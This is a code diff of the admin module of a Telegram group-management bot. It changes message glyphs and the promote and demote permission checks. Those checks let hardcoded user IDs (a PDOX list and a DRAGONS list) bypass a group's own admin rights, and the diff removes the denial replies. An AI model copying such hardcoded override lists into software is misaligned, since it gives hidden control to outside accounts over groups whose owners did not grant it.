@@ -1,8 +1,6 @@
 import html
 import os
 from telethon.tl import functions, types
-
-
 from telegram import ParseMode, Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.error import BadRequest
 from telegram.ext import CallbackContext, CommandHandler
@@ -31,7 +29,6 @@ from YukiBot.modules.log_channel import loggable
 PDOX = [6259443940, 6908541951, 7024859229, 6810396528]
 ####
 
-#########----func----###############
 async def can_promote_users(message):
     result = await pbot(
         functions.channels.GetParticipantRequest(
@@ -44,7 +41,6 @@ async def can_promote_users(message):
             isinstance(p, types.ChannelParticipantAdmin) and p.admin_rights.ban_users
     )
 
-#########----func----################
 
 @bot_admin
 @user_admin
@@ -55,26 +51,26 @@ def set_sticker(update: Update, context: CallbackContext):
 
     if user_can_changeinfo(chat, user, context.bot.id) is False:
         return msg.reply_text(
-            "↻ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴄʜᴀɴɢᴇ ɢʀᴏᴜᴩ ɪɴғᴏ ʙᴀʙʏ !"
+            "๏ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴄʜᴀɴɢᴇ ɢʀᴏᴜᴩ ɪɴғᴏ ʙᴀʙʏ !"
         )
 
     if msg.reply_to_message:
         if not msg.reply_to_message.sticker:
             return msg.reply_text(
-                "↻ ʀᴇᴩʟʏ ᴛᴏ ᴀ sᴛɪᴄᴋᴇʀ ᴛᴏ sᴇᴛ ɪᴛ ᴀs ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ !"
+                "๏ ʀᴇᴩʟʏ ᴛᴏ ᴀ sᴛɪᴄᴋᴇʀ ᴛᴏ sᴇᴛ ɪᴛ ᴀs ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ !"
             )
         stkr = msg.reply_to_message.sticker.set_name
         try:
             context.bot.set_chat_sticker_set(chat.id, stkr)
-            msg.reply_text(f"↻ sᴜᴄᴄᴇssғᴜʟʟʏ sᴇᴛ ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀs ɪɴ {chat.title}!")
+            msg.reply_text(f"๏ sᴜᴄᴄᴇssғᴜʟʟʏ sᴇᴛ ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀs ɪɴ {chat.title}!")
         except BadRequest as excp:
             if excp.message == "Participants_too_few":
                 return msg.reply_text(
-                    "↻ ʏᴏᴜʀ ɢʀᴏᴜᴩ ɴᴇᴇᴅs ᴍɪɴɪᴍᴜᴍ 100 ᴍᴇᴍʙᴇʀs ғᴏʀ sᴇᴛᴛɪɴɢ ᴀ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ ᴀs ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ !"
+                    "๏ ʏᴏᴜʀ ɢʀᴏᴜᴩ ɴᴇᴇᴅs ᴍɪɴɪᴍᴜᴍ 100 ᴍᴇᴍʙᴇʀs ғᴏʀ sᴇᴛᴛɪɴɢ ᴀ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ ᴀs ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ !"
                 )
             msg.reply_text(f"ᴇʀʀᴏʀ ! {excp.message}.")
     else:
-        msg.reply_text("↻ ʀᴇᴩʟʏ ᴛᴏ ᴀ sᴛɪᴄᴋᴇʀ ᴛᴏ sᴇᴛ ɪᴛ ᴀs ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ !")
+        msg.reply_text("๏ ʀᴇᴩʟʏ ᴛᴏ ᴀ sᴛɪᴄᴋᴇʀ ᴛᴏ sᴇᴛ ɪᴛ ᴀs ɢʀᴏᴜᴩ sᴛɪᴄᴋᴇʀ ᴩᴀᴄᴋ !")
 
 
 @bot_admin
@@ -85,7 +81,7 @@ def setchatpic(update: Update, context: CallbackContext):
     user = update.effective_user
 
     if user_can_changeinfo(chat, user, context.bot.id) is False:
-        msg.reply_text("↻ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴄʜᴀɴɢᴇ ɢʀᴏᴜᴩ ɪɴғᴏ ʙᴀʙʏ !")
+        msg.reply_text("๏ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴄʜᴀɴɢᴇ ɢʀᴏᴜᴩ ɪɴғᴏ ʙᴀʙʏ !")
         return
 
     if msg.reply_to_message:
@@ -94,15 +90,15 @@ def setchatpic(update: Update, context: CallbackContext):
         elif msg.reply_to_message.document:
             pic_id = msg.reply_to_message.document.file_id
         else:
-            msg.reply_text("↻ ʏᴏᴜ ᴄᴀɴ ᴏɴʟʏ sᴇᴛ ᴩʜᴏᴛᴏs ᴀs ɢʀᴏᴜᴩ ᴩғᴩ !")
+            msg.reply_text("๏ ʏᴏᴜ ᴄᴀɴ ᴏɴʟʏ sᴇᴛ ᴩʜᴏᴛᴏs ᴀs ɢʀᴏᴜᴩ ᴩғᴩ !")
             return
-        dlmsg = msg.reply_text("↻ ᴄʜᴀɴɢɪɴɢ ɢʀᴏᴜᴩ's ᴩʀᴏғɪʟᴇ ᴩɪᴄ...")
+        dlmsg = msg.reply_text("๏ ᴄʜᴀɴɢɪɴɢ ɢʀᴏᴜᴩ's ᴩʀᴏғɪʟᴇ ᴩɪᴄ...")
         tpic = context.bot.get_file(pic_id)
         tpic.download("gpic.png")
         try:
             with open("gpic.png", "rb") as chatp:
                 context.bot.set_chat_photo(int(chat.id), photo=chatp)
-                msg.reply_text("↻ sᴜᴄᴄᴇssғᴜʟʟʏ sᴇᴛ ɢʀᴏᴜᴩ ᴩʀᴏғɪʟᴇ ᴩɪᴄ !")
+                msg.reply_text("๏ sᴜᴄᴄᴇssғᴜʟʟʏ sᴇᴛ ɢʀᴏᴜᴩ ᴩʀᴏғɪʟᴇ ᴩɪᴄ !")
         except BadRequest as excp:
             msg.reply_text(f"ᴇʀʀᴏʀ ! {excp.message}")
         finally:
@@ -110,7 +106,7 @@ def setchatpic(update: Update, context: CallbackContext):
             if os.path.isfile("gpic.png"):
                 os.remove("gpic.png")
     else:
-        msg.reply_text("↻ ʀᴇᴩʟʏ ᴛᴏ ᴀ ᴩʜᴏᴛᴏ ᴏʀ ғɪʟᴇ ᴛᴏ sᴇᴛ ɪᴛ ᴀs ɢʀᴏᴜᴩ ᴩʀᴏғɪʟᴇ ᴩɪᴄ !")
+        msg.reply_text("๏ ʀᴇᴩʟʏ ᴛᴏ ᴀ ᴩʜᴏᴛᴏ ᴏʀ ғɪʟᴇ ᴛᴏ sᴇᴛ ɪᴛ ᴀs ɢʀᴏᴜᴩ ᴩʀᴏғɪʟᴇ ᴩɪᴄ !")
 
 
 @bot_admin
@@ -121,11 +117,11 @@ def rmchatpic(update: Update, context: CallbackContext):
     user = update.effective_user
 
     if user_can_changeinfo(chat, user, context.bot.id) is False:
-        msg.reply_text("↻ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴄʜᴀɴɢᴇ ɢʀᴏᴜᴩ ɪɴғᴏ ʙᴀʙʏ !")
+        msg.reply_text("๏ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴄʜᴀɴɢᴇ ɢʀᴏᴜᴩ ɪɴғᴏ ʙᴀʙʏ !")
         return
     try:
         context.bot.delete_chat_photo(int(chat.id))
-        msg.reply_text("↻ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ɢʀᴏᴜᴩ's ᴅᴇғᴀᴜʟᴛ ᴩʀᴏғɪʟᴇ ᴩɪᴄ !")
+        msg.reply_text("๏ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ɢʀᴏᴜᴩ's ᴅᴇғᴀᴜʟᴛ ᴩʀᴏғɪʟᴇ ᴩɪᴄ !")
     except BadRequest as excp:
         msg.reply_text(f"ᴇʀʀᴏʀ ! {excp.message}.")
         return
@@ -205,8 +201,8 @@ def promote(update: Update, context: CallbackContext) -> str:
     if (
         not (promoter.can_promote_members or promoter.status == "creator")
         and user.id not in PDOX
+        and user.id not in DRAGONS
     ):
-        message.reply_text("⌥ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴀᴅᴅ ɴᴇᴡ ᴀᴅᴍɪɴs ʙᴀʙʏ !")
         return
 
     user_id = extract_user(message, args)
@@ -290,8 +286,8 @@ def lowpromote(update: Update, context: CallbackContext) -> str:
     if (
         not (promoter.can_promote_members or promoter.status == "creator")
         and user.id not in PDOX
+        and user.id not in DRAGONS
     ):
-        message.reply_text("» ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴀᴅᴅ ɴᴇᴡ ᴀᴅᴍɪɴs ʙᴀʙʏ !")
         return
 
     user_id = extract_user(message, args)
@@ -371,8 +367,8 @@ def fullpromote(update: Update, context: CallbackContext) -> str:
     if (
         not (promoter.can_promote_members or promoter.status == "creator")
         and user.id not in PDOX
+        and user.id not in DRAGONS
     ):
-        message.reply_text("» ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ᴛᴏ ᴀᴅᴅ ɴᴇᴡ ᴀᴅᴍɪɴs ʙᴀʙʏ !")
         return
 
     user_id = extract_user(message, args)
@@ -449,22 +445,22 @@ def demote(update: Update, context: CallbackContext) -> str:
     bot = context.bot
     args = context.args
 
-    message = update.effective_message
     chat = update.effective_chat
+    message = update.effective_message
     user = update.effective_user
-
     promoter = chat.get_member(user.id)
+
 
     if (
         not (promoter.can_promote_members or promoter.status == "creator")
         and user.id not in PDOX
+        and user.id not in DRAGONS
     ):
-        message.reply_text("⌥ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴩᴇʀᴍɪssɪᴏɴs ʙᴀʙʏ !")
         return
 
     if user_can_promote(chat, user, bot.id) is False:
         message.reply_text("ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴇɴᴏᴜɢʜ ʀɪɢʜᴛs ᴛᴏ ᴅᴇᴍᴏᴛᴇ sᴏᴍᴇᴏɴᴇ!")
-        return ""
+        return
 
     user_id = extract_user(message, args)
     if not user_id:
@@ -804,7 +800,7 @@ def invite(update: Update, context: CallbackContext):
 @connection_status
 def adminlist(update, context):
     chat = update.effective_chat  
-    user = update.effective_user  # type: Optional[User]
+    user = update.effective_user 
     args = context.args  # -> unused variable
     bot = context.bot
 
@@ -856,7 +852,7 @@ def adminlist(update, context):
         # if user.username:
         #    name = escape_markdown("@" + user.username)
         if status == "creator":
-            text += "\n\n\n↻ ғᴏᴜɴᴅᴇʀ ᴏᴡɴᴇʀ ➠ {}".format(name)
+            text += "\n\n\n๏ ғᴏᴜɴᴅᴇʀ ᴏᴡɴᴇʀ ➠ {}".format(name)
 
 
     text += "\n\n✦ ᴀᴅᴍɪɴs ʟɪsᴛ ✦\n"
@@ -890,11 +886,11 @@ def adminlist(update, context):
                 normal_admin_list.append(name)
 
     for admin in normal_admin_list:
-        text += "\n<code> ↻ ᴄᴏ-ғᴏᴜɴᴅᴇʀ ➠ </code>{}".format(admin)
+        text += "\n<code> ๏ ᴄᴏ-ғᴏᴜɴᴅᴇʀ ➠ </code>{}".format(admin)
 
     for admin_group in custom_admin_list.copy():
         if len(custom_admin_list[admin_group]) == 1:
-            text += "\n<code> ↻ ᴀᴅᴍɪɴ ɴᴀᴍᴇ ➠ </code>{}".format(
+            text += "\n<code> ๏ ᴀᴅᴍɪɴ ɴᴀᴍᴇ ➠ </code>{}".format(
                 custom_admin_list[admin_group][0],
                 html.escape(admin_group),
             )
@@ -923,10 +919,10 @@ async def listbots(client, message):
         text3 = f"**✦ ʙᴏᴛ ʟɪsᴛ ➛ {message.chat.title}**\n\n✦ ʙᴏᴛs ✦\n\n"
         while len(botList) > 1:
             bot = botList.pop(0)
-            text3 += f"↻ @{bot.username}\n"
+            text3 += f"๏ @{bot.username}\n"
         else:
             bot = botList.pop(0)
-            text3 += f"↻ @{bot.username}\n\n"
+            text3 += f"๏ @{bot.username}\n\n"
             text3 += f"✦ || **ᴛᴏᴛᴀʟ ɴᴜᴍʙᴇʀ ᴏғ ʙᴏᴛs** ➠ {lenBotList}"
             await pbot.send_message(message.chat.id, text3)
     except FloodWait as e:
@@ -936,7 +932,7 @@ async def listbots(client, message):
 
 
 __help__ = """
-*✿ ᴀᴅᴍɪɴs ᴄᴏᴍᴍᴀɴᴅ ✿* 
+* ᴀᴅᴍɪɴs ᴄᴏᴍᴍᴀɴᴅ * 
 
 ⌥ /pin* ➛* sɪʟᴇɴᴛʟʏ ᴘɪɴs ᴛʜᴇ ᴍᴇssᴀɢᴇ ʀᴇᴘʟɪᴇᴅ ᴛᴏ - ᴀᴅᴅ `'ʟᴏᴜᴅ'` ᴏʀ `'ɴᴏᴛɪғʏ'` ᴛᴏ ɢɪᴠᴇ ɴᴏᴛɪғs ᴛᴏ ᴜsᴇʀs
 ⌥ /unpin* ➛* ᴜɴᴘɪɴs ᴛʜᴇ ᴄᴜʀʀᴇɴᴛʟʏ ᴘɪɴɴᴇᴅ ᴍᴇssᴀɢᴇ
